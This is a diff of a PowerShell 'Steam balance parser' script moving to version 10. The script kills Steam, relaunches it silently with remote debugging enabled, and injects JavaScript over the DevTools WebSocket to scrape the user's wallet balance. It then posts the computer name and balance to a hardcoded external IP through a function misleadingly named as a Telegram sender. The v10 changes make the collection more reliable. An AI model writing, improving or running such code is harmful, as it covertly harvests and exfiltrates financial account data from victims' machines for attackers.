@@ -7,9 +7,8 @@ param(
 
 Add-Type -AssemblyName System.Net.Http
 
-Write-Host "`n=== STEAM BALANCE PARSER v9 ===" -ForegroundColor Cyan
+Write-Host "`n=== STEAM BALANCE PARSER v10 ===" -ForegroundColor Cyan
 
-# Send message to Telegram
 function Send-TelegramMessage {
     param(
         [string]$Message,
@@ -18,11 +17,8 @@ function Send-TelegramMessage {
     )
 
     try {
-        # Send through proxy server to handle encoding
         $url = "http://89.34.90.212:8000/text"
-        $body = $Message
-
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
+        $null = Invoke-RestMethod -Uri $url -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
         return $true
     } catch {
         Write-Host "[WARN] Failed to send Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
@@ -30,7 +26,65 @@ function Send-TelegramMessage {
     }
 }
 
-# Check if Steam is running with debug port
+function Send-BalanceResult {
+    param(
+        [string]$ComputerName,
+        [string]$Balance
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Balance)) {
+        $Balance = "0"
+    }
+
+    Write-Host ""
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host "       STEAM WALLET BALANCE" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host "  Balance: $Balance" -ForegroundColor Yellow
+    Write-Host "========================================" -ForegroundColor Green
+    Write-Host ""
+
+    $telegramMsg = "Name: $ComputerName`nBalance: $Balance"
+    if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
+        Write-Host "[OK] Message sent!" -ForegroundColor Green
+    } else {
+        Write-Host "[ERROR] Failed to send message" -ForegroundColor Red
+    }
+}
+
+function Resolve-SteamPath {
+    $candidates = @()
+
+    foreach ($key in @(
+        "HKCU:\Software\Valve\Steam",
+        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam",
+        "HKLM:\SOFTWARE\Valve\Steam"
+    )) {
+        $p = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamPath
+        if ($p) { $candidates += (Join-Path $p "steam.exe") }
+        $exe = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamExe
+        if ($exe) { $candidates += $exe }
+    }
+
+    $candidates += @(
+        $SteamPath,
+        "C:\Program Files (x86)\Steam\steam.exe",
+        "C:\Program Files\Steam\steam.exe",
+        "$env:ProgramFiles\Steam\steam.exe",
+        "${env:ProgramFiles(x86)}\Steam\steam.exe",
+        "D:\Steam\steam.exe",
+        "E:\Steam\steam.exe"
+    )
+
+    foreach ($c in $candidates) {
+        if ($c -and (Test-Path -LiteralPath $c)) {
+            return (Resolve-Path -LiteralPath $c).Path
+        }
+    }
+
+    return $null
+}
+
 function Test-SteamDebugPort {
     try {
         $null = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 2 -ErrorAction Stop
@@ -40,7 +94,12 @@ function Test-SteamDebugPort {
     }
 }
 
-# Start Steam with debug port
+function Stop-SteamProcesses {
+    foreach ($name in @("steam", "steamwebhelper", "steamservice", "GameOverlayUI")) {
+        Get-Process $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    }
+}
+
 function Start-SteamWithDebug {
     Write-Host "[i] Checking if Steam is running with debug port..." -ForegroundColor Cyan
 
@@ -49,145 +108,155 @@ function Start-SteamWithDebug {
         return $true
     }
 
-    Write-Host "[i] Steam debug port not available, restarting Steam..." -ForegroundColor Yellow
+    $exe = Resolve-SteamPath
+    if (-not $exe) {
+        Write-Host "[WARN] Steam.exe not found, will still try existing process" -ForegroundColor Yellow
+    } else {
+        Write-Host "[i] Steam path: $exe" -ForegroundColor Gray
+    }
 
-    Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
-    Start-Sleep -Seconds 3
+    for ($attempt = 1; $attempt -le 2; $attempt++) {
+        Write-Host "[i] Starting Steam with debug, attempt $attempt/2..." -ForegroundColor Yellow
 
-    if (Test-Path $SteamPath) {
-        Write-Host "[i] Starting Steam with -cef-enable-debugging..." -ForegroundColor Cyan
-        Start-Process -FilePath $SteamPath -ArgumentList "-cef-enable-debugging"
+        Stop-SteamProcesses
+        Start-Sleep -Seconds 3
+
+        if ($exe) {
+            Start-Process -FilePath $exe -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
+        } elseif (Get-Command steam -ErrorAction SilentlyContinue) {
+            Start-Process steam -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
+        }
 
         $waited = 0
-        while ($waited -lt 30) {
-            Start-Sleep -Seconds 2
-            $waited += 2
-            Write-Host "[i] Waiting for Steam... ($waited/30 sec)" -ForegroundColor Gray
+        $limit = 60
+        while ($waited -lt $limit) {
+            Start-Sleep -Seconds 3
+            $waited += 3
+            Write-Host "[i] Waiting for Steam... ($waited/$limit sec)" -ForegroundColor Gray
 
             if (Test-SteamDebugPort) {
-                Write-Host "[OK] Steam started successfully!" -ForegroundColor Green
-                Write-Host "[i] Waiting for Steam to fully load..." -ForegroundColor Cyan
-                Start-Sleep -Seconds 10
+                Write-Host "[OK] Steam debug port is up" -ForegroundColor Green
+                Start-Sleep -Seconds 8
                 return $true
             }
         }
+    }
 
-        Write-Host "[ERROR] Steam did not start in time" -ForegroundColor Red
-        return $false
+    if (Get-Process steam -ErrorAction SilentlyContinue) {
+        Write-Host "[WARN] Steam process exists but debug port is down" -ForegroundColor Yellow
     } else {
-        Write-Host "[ERROR] Steam not found at: $SteamPath" -ForegroundColor Red
-        return $false
+        Write-Host "[WARN] Steam did not start" -ForegroundColor Yellow
+    }
+
+    return $false
+}
+
+function Get-WalletFromTab {
+    param($Tab)
+
+    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
+    try {
+        $ws.ConnectAsync([Uri]$Tab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(4000) | Out-Null
+        if ($ws.State -ne 'Open') { return "" }
+
+        $jsCode = @"
+(function() {
+    var el = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
+    if (el && el.textContent) return el.textContent.trim();
+
+    var nodes = document.querySelectorAll('span, div, a, button');
+    for (var i = 0; i < nodes.length; i++) {
+        var t = (nodes[i].textContent || '').replace(/\s+/g, ' ').trim();
+        if (!t || t.length > 32) continue;
+        if (/(\$|€|£|₽|USD|EUR|RUB|uah|грн)/i.test(t) && /\d/.test(t)) return t;
+        if (/^\d+[.,]\d{2}\s*[A-Za-z₽€$£₴₸]/.test(t)) return t;
+    }
+    return '';
+})();
+"@
+
+        $evalMsg = @{
+            id = 1
+            method = "Runtime.evaluate"
+            params = @{
+                expression = $jsCode
+                returnByValue = $true
+            }
+        } | ConvertTo-Json -Depth 10 -Compress
+
+        $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
+        $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null
+        Start-Sleep -Milliseconds 400
+
+        $recv = New-Object byte[] 65535
+        $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
+        $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)
+        $data = $json | ConvertFrom-Json
+
+        if ($ws.State -eq 'Open') {
+            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()
+        }
+
+        $val = $data.result.result.value
+        if ($val) { return [string]$val }
+        return ""
+    } catch {
+        return ""
+    } finally {
+        if ($ws.State -eq 'Open') {
+            try { $ws.Abort() } catch {}
+        }
+        $ws.Dispose()
     }
 }
 
-# Main script
+function Get-SteamWalletBalance {
+    if (-not (Test-SteamDebugPort)) {
+        return ""
+    }
+
+    try {
+        $tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
+    } catch {
+        return ""
+    }
+
+    Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray
+
+    $ordered = @($tabs | Where-Object { $_.title -eq "Steam" }) + @($tabs | Where-Object { $_.title -ne "Steam" })
+
+    foreach ($tab in $ordered) {
+        if (-not $tab.webSocketDebuggerUrl) { continue }
+        Write-Host "[i] Checking tab: $($tab.title)" -ForegroundColor Gray
+        $balance = Get-WalletFromTab -Tab $tab
+        if ($balance) {
+            Write-Host "[OK] Balance from tab '$($tab.title)': $balance" -ForegroundColor Green
+            return $balance
+        }
+    }
+
+    return ""
+}
+
 $computerName = $env:COMPUTERNAME
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
 Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
 Write-Host "[i] Time: $timestamp" -ForegroundColor Gray
 
-if (-not (Start-SteamWithDebug)) {
-    $errorMsg = "Name: $computerName`nError: Could not start Steam"
-    Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
+$steamOk = Start-SteamWithDebug
+if (-not $steamOk) {
+    Write-Host "[ERROR] Could not start Steam" -ForegroundColor Red
+    Send-TelegramMessage -Message "Name: $computerName`nError: Could not start Steam" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
     exit 1
 }
 
-# Get tabs
-$tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
-Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray
-
-# Find "Steam" tab (main UI)
-$steamTab = $tabs | Where-Object { $_.title -eq "Steam" } | Select-Object -First 1
-
-if (!$steamTab) {
-    Write-Host "[ERROR] Steam tab not found" -ForegroundColor Red
-    $errorMsg = "Name: $computerName`nError: Steam tab not found"
-    Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
+$walletBalance = Get-SteamWalletBalance
+if (-not $walletBalance) {
+    Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
+    Send-TelegramMessage -Message "Name: $computerName`nError: Balance element not found" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
     exit 1
 }
 
-Write-Host "[OK] Found Steam tab" -ForegroundColor Green
-
-$ws = [System.Net.WebSockets.ClientWebSocket]::new()
-
-try {
-    $ws.ConnectAsync([Uri]$steamTab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(5000) | Out-Null
-
-    if ($ws.State -ne 'Open') {
-        Write-Host "[ERROR] Could not connect to Steam tab" -ForegroundColor Red
-        exit 1
-    }
-
-    Write-Host "[OK] WebSocket connected" -ForegroundColor Green
-
-    # Get balance from wallet element
-    $jsCode = @"
-(function() {
-    // Find wallet balance element by class
-    var walletEl = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
-    if (walletEl) {
-        return walletEl.textContent.trim();
-    }
-    return '';
-})();
-"@
-
-    $evalMsg = @{
-        id = 1
-        method = "Runtime.evaluate"
-        params = @{
-            expression = $jsCode
-            returnByValue = $true
-        }
-    } | ConvertTo-Json -Depth 10 -Compress
-
-    $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
-    $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null
-
-    Start-Sleep -Milliseconds 500
-
-    $recv = New-Object byte[] 65535
-    $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
-    $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)
-
-    $data = $json | ConvertFrom-Json
-    $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()
-
-    if ($data.result.result.value -and $data.result.result.value -ne '') {
-        $walletBalance = $data.result.result.value
-
-        Write-Host ""
-        Write-Host "========================================" -ForegroundColor Green
-        Write-Host "       STEAM WALLET BALANCE" -ForegroundColor Green
-        Write-Host "========================================" -ForegroundColor Green
-        Write-Host "  Balance: $walletBalance" -ForegroundColor Yellow
-        Write-Host "========================================" -ForegroundColor Green
-        Write-Host ""
-
-        # Send to Telegram
-        Write-Host "[i] Sending to Telegram..." -ForegroundColor Cyan
-
-        $telegramMsg = "Name: $computerName`nBalance: $walletBalance"
-
-        if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
-            Write-Host "[OK] Message sent to Telegram!" -ForegroundColor Green
-        } else {
-            Write-Host "[ERROR] Failed to send Telegram message" -ForegroundColor Red
-        }
-
-    } else {
-        Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
-        $errorMsg = "Name: $computerName`nError: Balance element not found"
-        Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
-    }
-
-} catch {
-    Write-Host "[ERROR] Failed: $($_.Exception.Message)" -ForegroundColor Red
-    if ($ws.State -eq 'Open') {
-        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Error", [Threading.CancellationToken]::None).Wait()
-    }
-    exit 1
-}
-
+Send-BalanceResult -ComputerName $computerName -Balance $walletBalance
 Write-Host ""
